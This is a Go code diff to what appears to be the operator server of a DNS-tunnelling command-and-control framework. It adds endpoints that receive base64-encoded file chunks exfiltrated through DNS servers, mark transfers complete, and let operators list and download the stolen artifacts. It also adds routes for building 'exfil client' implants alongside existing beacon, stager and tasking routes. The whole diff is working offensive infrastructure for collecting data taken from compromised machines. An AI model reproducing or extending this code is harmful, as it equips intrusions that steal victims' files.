@@ -1754,6 +1754,119 @@ func (api *APIServer) handleResultComplete(w http.ResponseWriter, r *http.Reques
 	})
 }
 
+// handleSubmitExfilChunk stores a dedicated exfil chunk forwarded by a DNS server.
+func (api *APIServer) handleSubmitExfilChunk(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		APIKey      string `json:"api_key"`
+		SessionID   string `json:"session_id"`
+		JobID       string `json:"job_id"`
+		ChunkIndex  int    `json:"chunk_index"`
+		TotalChunks int    `json:"total_chunks"`
+		PayloadB64  string `json:"payload_b64"`
+		FileName    string `json:"file_name"`
+		FileSize    int64  `json:"file_size"`
+		IsFinal     bool   `json:"is_final"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if req.SessionID == "" || req.PayloadB64 == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id and payload_b64 are required")
+		return
+	}
+
+	payload, err := base64.StdEncoding.DecodeString(req.PayloadB64)
+	if err != nil {
+		api.sendError(w, http.StatusBadRequest, "payload_b64 must be valid base64")
+		return
+	}
+
+	transfer, completed, err := api.db.StoreExfilChunk(&ExfilChunkStoreRequest{
+		SessionID:   req.SessionID,
+		JobID:       req.JobID,
+		DNSServerID: dnsServerID,
+		ChunkIndex:  req.ChunkIndex,
+		TotalChunks: req.TotalChunks,
+		FileName:    req.FileName,
+		FileSize:    req.FileSize,
+		Payload:     payload,
+	})
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to store exfil chunk: %v", err))
+		return
+	}
+
+	response := map[string]interface{}{
+		"session_id": req.SessionID,
+		"ack_next":   true,
+		"completed":  completed,
+	}
+	if transfer != nil {
+		response["transfer"] = transfer
+		response["status"] = transfer.Status
+		response["received_chunks"] = transfer.ReceivedChunks
+		response["total_chunks"] = transfer.TotalChunks
+	}
+
+	api.sendSuccess(w, "exfil chunk recorded", response)
+}
+
+// handleExfilComplete records completion metadata for a dedicated exfil session.
+func (api *APIServer) handleExfilComplete(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID    string `json:"dns_server_id"`
+		APIKey         string `json:"api_key"`
+		SessionID      string `json:"session_id"`
+		JobID          string `json:"job_id"`
+		FileName       string `json:"file_name"`
+		FileSize       int64  `json:"file_size"`
+		TotalChunks    int    `json:"total_chunks"`
+		ReceivedChunks int    `json:"received_chunks"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.SessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id is required")
+		return
+	}
+
+	sourceDNS := r.Header.Get("X-DNS-Server-ID")
+	if sourceDNS == "" {
+		sourceDNS = req.DNSServerID
+	}
+
+	transfer, err := api.db.MarkExfilTransferComplete(&ExfilCompletionRecord{
+		SessionID:   req.SessionID,
+		JobID:       req.JobID,
+		TotalChunks: req.TotalChunks,
+		FileName:    req.FileName,
+		FileSize:    req.FileSize,
+		SourceDNS:   sourceDNS,
+	})
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to finalize exfil transfer: %v", err))
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfer updated", map[string]interface{}{
+		"session_id": req.SessionID,
+		"transfer":   transfer,
+	})
+}
+
 // handleSubmitProgress processes task progress updates from DNS servers
 func (api *APIServer) handleSubmitProgress(w http.ResponseWriter, r *http.Request) {
 	var req TaskProgressRequest
@@ -1885,6 +1998,92 @@ func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
 	}
 
 	api.sendJSON(w, stats)
+}
+
+// Exfiltration endpoints
+
+func (api *APIServer) handleListExfilTransfers(w http.ResponseWriter, r *http.Request) {
+	limit := 100
+	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
+		if parsed, err := strconv.Atoi(limitStr); err == nil && parsed > 0 && parsed <= 500 {
+			limit = parsed
+		}
+	}
+
+	offset := 0
+	if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
+		if parsed, err := strconv.Atoi(offsetStr); err == nil && parsed >= 0 {
+			offset = parsed
+		}
+	}
+
+	transfers, err := api.db.ListExfilTransfers(limit, offset)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to list exfil transfers")
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfers retrieved", map[string]interface{}{
+		"transfers": transfers,
+		"pagination": map[string]interface{}{
+			"limit":  limit,
+			"offset": offset,
+			"count":  len(transfers),
+		},
+	})
+}
+
+func (api *APIServer) handleGetExfilTransfer(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+	if sessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id is required")
+		return
+	}
+
+	transfer, err := api.db.GetExfilTransfer(sessionID)
+	if err != nil {
+		if strings.Contains(strings.ToLower(err.Error()), "not found") {
+			api.sendError(w, http.StatusNotFound, "exfil transfer not found")
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to load exfil transfer")
+		}
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfer retrieved", transfer)
+}
+
+func (api *APIServer) handleDownloadExfilArtifact(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+	if sessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id is required")
+		return
+	}
+
+	data, fileName, sha, err := api.db.GetExfilArtifact(sessionID)
+	if err != nil {
+		if strings.Contains(strings.ToLower(err.Error()), "not found") {
+			api.sendError(w, http.StatusNotFound, err.Error())
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to load exfil artifact")
+		}
+		return
+	}
+
+	if fileName == "" {
+		fileName = sessionID + ".bin"
+	}
+
+	reader := bytes.NewReader(data)
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", fileName))
+	if sha != "" {
+		w.Header().Set("X-Exfil-SHA256", sha)
+	}
+	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
+	http.ServeContent(w, r, fileName, time.Now(), reader)
 }
 
 // Stager Management Handlers
@@ -2429,10 +2628,15 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	operatorRouter.HandleFunc("/tasks/{id}/progress", api.handleGetTaskProgress).Methods("GET")
 	operatorRouter.HandleFunc("/tasks/{id}/status", api.handleGetTaskStatus).Methods("GET")
 	operatorRouter.HandleFunc("/stats", api.handleStats).Methods("GET")
+	operatorRouter.HandleFunc("/exfil/transfers", api.handleListExfilTransfers).Methods("GET")
+	operatorRouter.HandleFunc("/exfil/transfers/{id}", api.handleGetExfilTransfer).Methods("GET")
+	operatorRouter.HandleFunc("/exfil/transfers/{id}/download", api.handleDownloadExfilArtifact).Methods("GET")
 
 	// Builder endpoints
 	operatorRouter.HandleFunc("/builder/dns-server", api.handleBuildDNSServer).Methods("POST")
 	operatorRouter.HandleFunc("/builder/client", api.handleBuildClient).Methods("POST")
+	operatorRouter.HandleFunc("/builder/exfil-client", api.handleBuildExfilClient).Methods("POST")
+	operatorRouter.HandleFunc("/builder/exfil-client/builds", api.handleListExfilClientBuilds).Methods("GET")
 	operatorRouter.HandleFunc("/builder/client-binaries", api.handleListClientBinaries).Methods("GET")
 	operatorRouter.HandleFunc("/builder/stager", api.handleBuildStager).Methods("POST")
 	operatorRouter.HandleFunc("/builder/builds", api.handleListBuilds).Methods("GET")
@@ -2453,6 +2657,8 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/beacon", api.handleBeaconReport).Methods("POST")
 	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
 	dnsRouter.HandleFunc("/result/complete", api.handleResultComplete).Methods("POST")
+	dnsRouter.HandleFunc("/exfil/chunk", api.handleSubmitExfilChunk).Methods("POST")
+	dnsRouter.HandleFunc("/exfil/complete", api.handleExfilComplete).Methods("POST")
 	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
 	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
 	dnsRouter.HandleFunc("/tasks/delivered", api.handleMarkTaskDelivered).Methods("POST")
